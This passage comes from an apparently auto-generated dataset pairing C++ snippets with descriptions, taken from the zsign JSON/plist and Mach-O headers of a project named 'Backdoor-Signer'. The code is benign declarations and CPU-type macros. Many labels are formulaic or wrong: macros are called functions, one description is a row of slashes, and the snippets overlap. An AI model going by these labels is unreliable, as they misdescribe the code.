    "code": "bool addError(const string &message, const char *ploc);",
    "nl": "Function addError - implements adderror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "870",
    "code": "class JWriter\n{",
    "nl": "class JWriter - implements functionality related to j writer",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "class"
  },
  {
    "id": "871",
    "code": "static void FastWrite(const JValue &jval, string &strDoc);",
    "nl": "Function FastWrite - implements fastwrite functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "872",
    "code": "static void FastWriteValue(const JValue &jval, string &strDoc);",
    "nl": "Function FastWriteValue - implements fastwritevalue functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "873",
    "code": "void PushValue(const string &strval);",
    "nl": "Function PushValue - implements pushvalue functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "874",
    "code": "void StyleWriteValue(const JValue &jval);",
    "nl": "Function StyleWriteValue - implements stylewritevalue functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "875",
    "code": "void StyleWriteArrayValue(const JValue &jval);",
    "nl": "Function StyleWriteArrayValue - implements stylewritearrayvalue functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "876",
    "code": "bool isMultineArray(const JValue &jval);",
    "nl": "Function isMultineArray - checks if multinearray",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "877",
    "code": "static string v2s(double val);",
    "nl": "Function v2s - implements v2s functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "878",
    "code": "static string v2s(int64_t val);",
    "nl": "Function v2s - implements v2s functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "879",
    "code": "static string v2s(const char *val);",
    "nl": "Function v2s - implements v2s functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "880",
    "code": "static string vstring2s(const char *val);",
    "nl": "Function vstring2s - implements vstring2s functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "881",
    "code": "static string d2s(time_t t);",
    "nl": "Function d2s - implements d2s functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "882",
    "code": "class PReader\n{",
    "nl": "////////////////////////////////////////////////////////////////////////",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "class"
  },
  {
    "id": "883",
    "code": "bool parse(const char *pdoc, size_t len, JValue &root);",
    "nl": "Function parse - implements parse functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "884",
    "code": "void error(string &strmsg) const;",
    "nl": "Function error - implements error functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "885",
    "code": "struct Token\n{",
    "nl": "struct Token - implements functionality related to token",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "struct"
  },
  {
    "id": "886",
    "code": "bool readToken(Token &token);",
    "nl": "Function readToken - implements readtoken functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "887",
    "code": "bool readLabel(string &label);",
    "nl": "Function readLabel - implements readlabel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "888",
    "code": "bool readValue(JValue &jval, Token &token);",
    "nl": "Function readValue - implements readvalue functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "889",
    "code": "bool readArray(JValue &jval);",
    "nl": "Function readArray - implements readarray functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "890",
    "code": "bool readNumber();",
    "nl": "Function readNumber - implements readnumber functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "891",
    "code": "bool readString();",
    "nl": "Function readString - implements readstring functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "892",
    "code": "bool readDictionary(JValue &jval);",
    "nl": "Function readDictionary - implements readdictionary functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "893",
    "code": "void endLabel(Token &token, const char *szLabel);",
    "nl": "Function endLabel - implements endlabel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "894",
    "code": "bool decodeNumber(Token &token, JValue &jval);",
    "nl": "Function decodeNumber - implements decodenumber functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "895",
    "code": "bool decodeString(Token &token, string &decoded, bool filter = true);",
    "nl": "Function decodeString - implements decodestring functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "896",
    "code": "bool decodeDouble(Token &token, JValue &jval);",
    "nl": "Function decodeDouble - implements decodedouble functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "897",
    "code": "void skipSpaces();",
    "nl": "Function skipSpaces - implements skipspaces functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "898",
    "code": "bool addError(const string &message, const char *ploc);",
    "nl": "Function addError - implements adderror functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "899",
    "code": "bool parseBinary(const char *pbdoc, size_t len, JValue &pv);",
    "nl": "Function parseBinary - implements parsebinary functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "900",
    "code": "uint32_t getUInt24FromBE(const char *v);",
    "nl": "Function getUInt24FromBE - retrieves uint24frombe",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "901",
    "code": "void byteConvert(uint8_t *v, size_t size);",
    "nl": "Function byteConvert - implements byteconvert functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "902",
    "code": "uint64_t getUIntVal(const char *v, size_t size);",
    "nl": "Function getUIntVal - retrieves uintval",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "903",
    "code": "bool readUIntSize(const char *&pcur, size_t &size);",
    "nl": "Function readUIntSize - implements readuintsize functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "904",
    "code": "bool readBinaryValue(const char *&pcur, JValue &pv);",
    "nl": "Function readBinaryValue - implements readbinaryvalue functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "905",
    "code": "bool readUnicode(const char *pcur, size_t size, JValue &pv);",
    "nl": "Function readUnicode - implements readunicode functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "906",
    "code": "static void XMLUnescape(string &strval);",
    "nl": "Function XMLUnescape - implements xmlunescape functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "907",
    "code": "class PWriter\n{",
    "nl": "class PWriter - implements functionality related to p writer",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "class"
  },
  {
    "id": "908",
    "code": "static void FastWrite(const JValue &pval, string &strdoc);",
    "nl": "Function FastWrite - implements fastwrite functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "909",
    "code": "static void FastWriteValue(const JValue &pval, string &strdoc, string &strindent);",
    "nl": "Function FastWriteValue - implements fastwritevalue functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "910",
    "code": "static void XMLEscape(string &strval);",
    "nl": "Function XMLEscape - implements xmlescape functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "911",
    "code": "#define CPU_TYPE_X86_64 (CPU_TYPE_X86 | CPU_ARCH_ABI64)\n#define CPU_TYPE_ARM64 (CPU_TYPE_ARM | CPU_ARCH_ABI64)\n#define CPU_TYPE_ARM64_32 (CPU_TYPE_ARM | CPU_ARCH_ABI64_32)\n#define CPU_TYPE_POWERPC64 (CPU_TYPE_POWERPC | CPU_ARCH_ABI64)\n\n/*\n*\tMachine subtypes (these are defined here, instead of in a machine\n*\tdependent directory, so that any program can get all definitions\n*\tregardless of where is it compiled).\n*/",
    "nl": "Function CPU_TYPE_X86_64 - implements cpu type x86 64 functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "912",
    "code": "#define CPU_TYPE_ARM64 (CPU_TYPE_ARM | CPU_ARCH_ABI64)\n#define CPU_TYPE_ARM64_32 (CPU_TYPE_ARM | CPU_ARCH_ABI64_32)\n#define CPU_TYPE_POWERPC64 (CPU_TYPE_POWERPC | CPU_ARCH_ABI64)\n\n/*\n*\tMachine subtypes (these are defined here, instead of in a machine\n*\tdependent directory, so that any program can get all definitions\n*\tregardless of where is it compiled).\n*/\n",
    "nl": "Function CPU_TYPE_ARM64 - implements cpu type arm64 functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "913",
    "code": "#define CPU_TYPE_ARM64_32 (CPU_TYPE_ARM | CPU_ARCH_ABI64_32)\n#define CPU_TYPE_POWERPC64 (CPU_TYPE_POWERPC | CPU_ARCH_ABI64)\n\n/*\n*\tMachine subtypes (these are defined here, instead of in a machine\n*\tdependent directory, so that any program can get all definitions\n*\tregardless of where is it compiled).\n*/\n\n/*",
    "nl": "Function CPU_TYPE_ARM64_32 - implements cpu type arm64 32 functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "914",
    "code": "#define CPU_TYPE_POWERPC64 (CPU_TYPE_POWERPC | CPU_ARCH_ABI64)\n\n/*\n*\tMachine subtypes (these are defined here, instead of in a machine\n*\tdependent directory, so that any program can get all definitions\n*\tregardless of where is it compiled).\n*/\n\n/*\n* Capability bits used in the definition of cpu_subtype.",
    "nl": "Function CPU_TYPE_POWERPC64 - implements cpu type powerpc64 functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "915",
    "code": "*\tMachine subtypes (these are defined here, instead of in a machine\n*\tdependent directory, so that any program can get all definitions\n*\tregardless of where is it compiled).\n*/\n\n/*\n* Capability bits used in the definition of cpu_subtype.\n*/\n#define CPU_SUBTYPE_MASK 0xff000000  /* mask for feature flags */\n#define CPU_SUBTYPE_LIB64 0x80000000 /* 64 bit libraries */",
    "nl": "Function subtypes - implements subtypes functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "916",
    "code": "#define CPU_SUBTYPE_INTEL(f, m) ((f) + ((m) << 4))\n\n#define CPU_SUBTYPE_I386_ALL CPU_SUBTYPE_INTEL(3, 0)\n#define CPU_SUBTYPE_386 CPU_SUBTYPE_INTEL(3, 0)\n#define CPU_SUBTYPE_486 CPU_SUBTYPE_INTEL(4, 0)\n#define CPU_SUBTYPE_486SX CPU_SUBTYPE_INTEL(4, 8) // 8 << 4 = 128\n#define CPU_SUBTYPE_586 CPU_SUBTYPE_INTEL(5, 0)\n#define CPU_SUBTYPE_PENT CPU_SUBTYPE_INTEL(5, 0)\n#define CPU_SUBTYPE_PENTPRO CPU_SUBTYPE_INTEL(6, 1)\n#define CPU_SUBTYPE_PENTII_M3 CPU_SUBTYPE_INTEL(6, 3)",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "917",
    "code": "#define CPU_SUBTYPE_I386_ALL CPU_SUBTYPE_INTEL(3, 0)\n#define CPU_SUBTYPE_386 CPU_SUBTYPE_INTEL(3, 0)\n#define CPU_SUBTYPE_486 CPU_SUBTYPE_INTEL(4, 0)\n#define CPU_SUBTYPE_486SX CPU_SUBTYPE_INTEL(4, 8) // 8 << 4 = 128\n#define CPU_SUBTYPE_586 CPU_SUBTYPE_INTEL(5, 0)\n#define CPU_SUBTYPE_PENT CPU_SUBTYPE_INTEL(5, 0)\n#define CPU_SUBTYPE_PENTPRO CPU_SUBTYPE_INTEL(6, 1)\n#define CPU_SUBTYPE_PENTII_M3 CPU_SUBTYPE_INTEL(6, 3)\n#define CPU_SUBTYPE_PENTII_M5 CPU_SUBTYPE_INTEL(6, 5)\n#define CPU_SUBTYPE_CELERON CPU_SUBTYPE_INTEL(7, 6)",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "918",
    "code": "#define CPU_SUBTYPE_386 CPU_SUBTYPE_INTEL(3, 0)\n#define CPU_SUBTYPE_486 CPU_SUBTYPE_INTEL(4, 0)\n#define CPU_SUBTYPE_486SX CPU_SUBTYPE_INTEL(4, 8) // 8 << 4 = 128\n#define CPU_SUBTYPE_586 CPU_SUBTYPE_INTEL(5, 0)\n#define CPU_SUBTYPE_PENT CPU_SUBTYPE_INTEL(5, 0)\n#define CPU_SUBTYPE_PENTPRO CPU_SUBTYPE_INTEL(6, 1)\n#define CPU_SUBTYPE_PENTII_M3 CPU_SUBTYPE_INTEL(6, 3)\n#define CPU_SUBTYPE_PENTII_M5 CPU_SUBTYPE_INTEL(6, 5)\n#define CPU_SUBTYPE_CELERON CPU_SUBTYPE_INTEL(7, 6)\n#define CPU_SUBTYPE_CELERON_MOBILE CPU_SUBTYPE_INTEL(7, 7)",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "919",
    "code": "#define CPU_SUBTYPE_486 CPU_SUBTYPE_INTEL(4, 0)\n#define CPU_SUBTYPE_486SX CPU_SUBTYPE_INTEL(4, 8) // 8 << 4 = 128\n#define CPU_SUBTYPE_586 CPU_SUBTYPE_INTEL(5, 0)\n#define CPU_SUBTYPE_PENT CPU_SUBTYPE_INTEL(5, 0)\n#define CPU_SUBTYPE_PENTPRO CPU_SUBTYPE_INTEL(6, 1)\n#define CPU_SUBTYPE_PENTII_M3 CPU_SUBTYPE_INTEL(6, 3)\n#define CPU_SUBTYPE_PENTII_M5 CPU_SUBTYPE_INTEL(6, 5)\n#define CPU_SUBTYPE_CELERON CPU_SUBTYPE_INTEL(7, 6)\n#define CPU_SUBTYPE_CELERON_MOBILE CPU_SUBTYPE_INTEL(7, 7)\n#define CPU_SUBTYPE_PENTIUM_3 CPU_SUBTYPE_INTEL(8, 0)",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "920",
    "code": "#define CPU_SUBTYPE_486SX CPU_SUBTYPE_INTEL(4, 8) // 8 << 4 = 128\n#define CPU_SUBTYPE_586 CPU_SUBTYPE_INTEL(5, 0)\n#define CPU_SUBTYPE_PENT CPU_SUBTYPE_INTEL(5, 0)\n#define CPU_SUBTYPE_PENTPRO CPU_SUBTYPE_INTEL(6, 1)\n#define CPU_SUBTYPE_PENTII_M3 CPU_SUBTYPE_INTEL(6, 3)\n#define CPU_SUBTYPE_PENTII_M5 CPU_SUBTYPE_INTEL(6, 5)\n#define CPU_SUBTYPE_CELERON CPU_SUBTYPE_INTEL(7, 6)\n#define CPU_SUBTYPE_CELERON_MOBILE CPU_SUBTYPE_INTEL(7, 7)\n#define CPU_SUBTYPE_PENTIUM_3 CPU_SUBTYPE_INTEL(8, 0)\n#define CPU_SUBTYPE_PENTIUM_3_M CPU_SUBTYPE_INTEL(8, 1)",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "921",
    "code": "#define CPU_SUBTYPE_586 CPU_SUBTYPE_INTEL(5, 0)\n#define CPU_SUBTYPE_PENT CPU_SUBTYPE_INTEL(5, 0)\n#define CPU_SUBTYPE_PENTPRO CPU_SUBTYPE_INTEL(6, 1)\n#define CPU_SUBTYPE_PENTII_M3 CPU_SUBTYPE_INTEL(6, 3)\n#define CPU_SUBTYPE_PENTII_M5 CPU_SUBTYPE_INTEL(6, 5)\n#define CPU_SUBTYPE_CELERON CPU_SUBTYPE_INTEL(7, 6)\n#define CPU_SUBTYPE_CELERON_MOBILE CPU_SUBTYPE_INTEL(7, 7)\n#define CPU_SUBTYPE_PENTIUM_3 CPU_SUBTYPE_INTEL(8, 0)\n#define CPU_SUBTYPE_PENTIUM_3_M CPU_SUBTYPE_INTEL(8, 1)\n#define CPU_SUBTYPE_PENTIUM_3_XEON CPU_SUBTYPE_INTEL(8, 2)",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "922",
    "code": "#define CPU_SUBTYPE_PENT CPU_SUBTYPE_INTEL(5, 0)\n#define CPU_SUBTYPE_PENTPRO CPU_SUBTYPE_INTEL(6, 1)\n#define CPU_SUBTYPE_PENTII_M3 CPU_SUBTYPE_INTEL(6, 3)\n#define CPU_SUBTYPE_PENTII_M5 CPU_SUBTYPE_INTEL(6, 5)\n#define CPU_SUBTYPE_CELERON CPU_SUBTYPE_INTEL(7, 6)\n#define CPU_SUBTYPE_CELERON_MOBILE CPU_SUBTYPE_INTEL(7, 7)\n#define CPU_SUBTYPE_PENTIUM_3 CPU_SUBTYPE_INTEL(8, 0)\n#define CPU_SUBTYPE_PENTIUM_3_M CPU_SUBTYPE_INTEL(8, 1)\n#define CPU_SUBTYPE_PENTIUM_3_XEON CPU_SUBTYPE_INTEL(8, 2)\n#define CPU_SUBTYPE_PENTIUM_M CPU_SUBTYPE_INTEL(9, 0)",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "923",
    "code": "#define CPU_SUBTYPE_PENTPRO CPU_SUBTYPE_INTEL(6, 1)\n#define CPU_SUBTYPE_PENTII_M3 CPU_SUBTYPE_INTEL(6, 3)\n#define CPU_SUBTYPE_PENTII_M5 CPU_SUBTYPE_INTEL(6, 5)\n#define CPU_SUBTYPE_CELERON CPU_SUBTYPE_INTEL(7, 6)\n#define CPU_SUBTYPE_CELERON_MOBILE CPU_SUBTYPE_INTEL(7, 7)\n#define CPU_SUBTYPE_PENTIUM_3 CPU_SUBTYPE_INTEL(8, 0)\n#define CPU_SUBTYPE_PENTIUM_3_M CPU_SUBTYPE_INTEL(8, 1)\n#define CPU_SUBTYPE_PENTIUM_3_XEON CPU_SUBTYPE_INTEL(8, 2)\n#define CPU_SUBTYPE_PENTIUM_M CPU_SUBTYPE_INTEL(9, 0)\n#define CPU_SUBTYPE_PENTIUM_4 CPU_SUBTYPE_INTEL(10, 0)",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "924",
    "code": "#define CPU_SUBTYPE_PENTII_M3 CPU_SUBTYPE_INTEL(6, 3)\n#define CPU_SUBTYPE_PENTII_M5 CPU_SUBTYPE_INTEL(6, 5)\n#define CPU_SUBTYPE_CELERON CPU_SUBTYPE_INTEL(7, 6)\n#define CPU_SUBTYPE_CELERON_MOBILE CPU_SUBTYPE_INTEL(7, 7)\n#define CPU_SUBTYPE_PENTIUM_3 CPU_SUBTYPE_INTEL(8, 0)\n#define CPU_SUBTYPE_PENTIUM_3_M CPU_SUBTYPE_INTEL(8, 1)\n#define CPU_SUBTYPE_PENTIUM_3_XEON CPU_SUBTYPE_INTEL(8, 2)\n#define CPU_SUBTYPE_PENTIUM_M CPU_SUBTYPE_INTEL(9, 0)\n#define CPU_SUBTYPE_PENTIUM_4 CPU_SUBTYPE_INTEL(10, 0)\n#define CPU_SUBTYPE_PENTIUM_4_M CPU_SUBTYPE_INTEL(10, 1)",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "925",
    "code": "#define CPU_SUBTYPE_PENTII_M5 CPU_SUBTYPE_INTEL(6, 5)\n#define CPU_SUBTYPE_CELERON CPU_SUBTYPE_INTEL(7, 6)\n#define CPU_SUBTYPE_CELERON_MOBILE CPU_SUBTYPE_INTEL(7, 7)\n#define CPU_SUBTYPE_PENTIUM_3 CPU_SUBTYPE_INTEL(8, 0)\n#define CPU_SUBTYPE_PENTIUM_3_M CPU_SUBTYPE_INTEL(8, 1)\n#define CPU_SUBTYPE_PENTIUM_3_XEON CPU_SUBTYPE_INTEL(8, 2)\n#define CPU_SUBTYPE_PENTIUM_M CPU_SUBTYPE_INTEL(9, 0)\n#define CPU_SUBTYPE_PENTIUM_4 CPU_SUBTYPE_INTEL(10, 0)\n#define CPU_SUBTYPE_PENTIUM_4_M CPU_SUBTYPE_INTEL(10, 1)\n#define CPU_SUBTYPE_ITANIUM CPU_SUBTYPE_INTEL(11, 0)",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "926",
    "code": "#define CPU_SUBTYPE_CELERON CPU_SUBTYPE_INTEL(7, 6)\n#define CPU_SUBTYPE_CELERON_MOBILE CPU_SUBTYPE_INTEL(7, 7)\n#define CPU_SUBTYPE_PENTIUM_3 CPU_SUBTYPE_INTEL(8, 0)\n#define CPU_SUBTYPE_PENTIUM_3_M CPU_SUBTYPE_INTEL(8, 1)\n#define CPU_SUBTYPE_PENTIUM_3_XEON CPU_SUBTYPE_INTEL(8, 2)\n#define CPU_SUBTYPE_PENTIUM_M CPU_SUBTYPE_INTEL(9, 0)\n#define CPU_SUBTYPE_PENTIUM_4 CPU_SUBTYPE_INTEL(10, 0)\n#define CPU_SUBTYPE_PENTIUM_4_M CPU_SUBTYPE_INTEL(10, 1)\n#define CPU_SUBTYPE_ITANIUM CPU_SUBTYPE_INTEL(11, 0)\n#define CPU_SUBTYPE_ITANIUM_2 CPU_SUBTYPE_INTEL(11, 1)",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "927",
    "code": "#define CPU_SUBTYPE_CELERON_MOBILE CPU_SUBTYPE_INTEL(7, 7)\n#define CPU_SUBTYPE_PENTIUM_3 CPU_SUBTYPE_INTEL(8, 0)\n#define CPU_SUBTYPE_PENTIUM_3_M CPU_SUBTYPE_INTEL(8, 1)\n#define CPU_SUBTYPE_PENTIUM_3_XEON CPU_SUBTYPE_INTEL(8, 2)\n#define CPU_SUBTYPE_PENTIUM_M CPU_SUBTYPE_INTEL(9, 0)\n#define CPU_SUBTYPE_PENTIUM_4 CPU_SUBTYPE_INTEL(10, 0)\n#define CPU_SUBTYPE_PENTIUM_4_M CPU_SUBTYPE_INTEL(10, 1)\n#define CPU_SUBTYPE_ITANIUM CPU_SUBTYPE_INTEL(11, 0)\n#define CPU_SUBTYPE_ITANIUM_2 CPU_SUBTYPE_INTEL(11, 1)\n#define CPU_SUBTYPE_XEON CPU_SUBTYPE_INTEL(12, 0)",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
